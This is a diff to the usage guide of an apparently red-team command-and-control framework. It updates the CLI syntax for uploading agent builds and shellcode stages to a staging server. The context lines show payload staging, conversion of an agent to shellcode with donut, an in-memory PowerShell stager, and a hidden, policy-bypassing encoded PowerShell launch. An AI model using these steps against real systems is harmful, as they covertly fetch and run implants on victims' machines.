@@ -104,10 +104,9 @@ go run ./cmd/generate stageless \
 ### Step 3 — Upload Agent to the Stage Endpoint
 
 ```bash
-go run ./cmd/generate upload \
+go run ./cmd/generate upload ./builds/agent.exe \
   --server http://SERVER:8080 \
-  --file ./builds/agent.exe \
-  --name "engagement-q2-2026"
+  --desc "engagement-q2-2026"
 ```
 
 **Output:**
@@ -224,10 +223,10 @@ powershell -w hidden -ep bypass -enc <B64>
 donut -i ./builds/agent.exe -o ./builds/agent.bin -a 2
 
 # Step 2: Upload the shellcode (not EXE) as the stage
-go run ./cmd/generate upload \
+go run ./cmd/generate upload ./builds/agent.bin \
   --server http://SERVER:8080 \
-  --file ./builds/agent.bin \
-  --name "shellcode-stage"
+  --format shellcode \
+  --desc "shellcode-stage"
 
 # Step 3: Generate ps1-mem stager with shellcode token
 go run ./cmd/generate stager \
@@ -515,7 +514,7 @@ Fix:
 ❯ stages
 
 # Re-upload if needed
-go run ./cmd/generate upload --server http://SERVER:8080 --file ./builds/agent.exe --name retry
+go run ./cmd/generate upload ./builds/agent.exe --server http://SERVER:8080 --desc "retry"
 # Generate new stager with new token
 ```
 
@@ -557,10 +556,9 @@ go run ./cmd/generate stageless \
   --output ./builds/agent.exe
 
 # ─── UPLOAD TO STAGE ───────────────────────────────────────────────
-go run ./cmd/generate upload \
+go run ./cmd/generate upload ./builds/agent.exe \
   --server http://SERVER:8080 \
-  --file ./builds/agent.exe \
-  --name "engagement-label"
+  --desc "engagement-label"
 # → saves token
 
 # ─── GENERATE STAGER ───────────────────────────────────────────────
